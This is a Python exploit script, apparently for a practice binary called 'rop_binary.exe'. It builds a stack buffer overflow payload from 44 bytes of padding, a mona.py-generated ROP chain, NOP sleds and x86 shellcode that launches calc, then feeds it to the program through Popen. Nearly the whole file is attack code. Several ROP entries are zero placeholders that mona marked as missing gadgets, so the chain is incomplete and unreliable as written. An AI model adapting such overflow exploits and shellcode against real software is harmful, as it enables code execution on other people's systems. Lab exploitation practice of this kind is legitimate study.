from subprocess import Popen, PIPE
import struct
from pwn import *

# offset 44 EIP
jmp_esp = 0x75aed47f 

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
      0x00000000,  # [-] Unable to find ptr to &VirtualAlloc()
      #[---INFO:gadgets_to_set_ebp:---]
      0x0040220a,  # POP EBP # RETN [rop_binary.exe] 
      0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
      #[---INFO:gadgets_to_set_ebx:---]
      0x00401f91,  # POP EBX # RETN [rop_binary.exe] 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x004026c8,  # POP ECX # RETN [rop_binary.exe] 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x00402699,  # POP EDI # RETN [rop_binary.exe] 
      0x00402689,  # RETN (ROP NOP) [rop_binary.exe]
      #[---INFO:gadgets_to_set_eax:---]
      0x004026c7,  # POP EAX # POP ECX # RETN [rop_binary.exe] 
      0x90909090,  # nop
      0x41414141,  # Filler (compensate)
      #[---INFO:pushad:---]
      0x00000000,  # [-] Unable to find pushad gadget
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()


#payload = ""
#payload += "A"*44
#payload += p32(jmp_esp) # b"\x7f\xd4\xae\x75"
#payload += (b"\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7")

nop = "\x90"*16

payload = ""
payload += "A"*44
payload += rop_chain + nop
payload += (b"\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7")

p = Popen(["rop_binary.exe"], stdout=PIPE, stdin=PIPE)
p.communicate(payload)

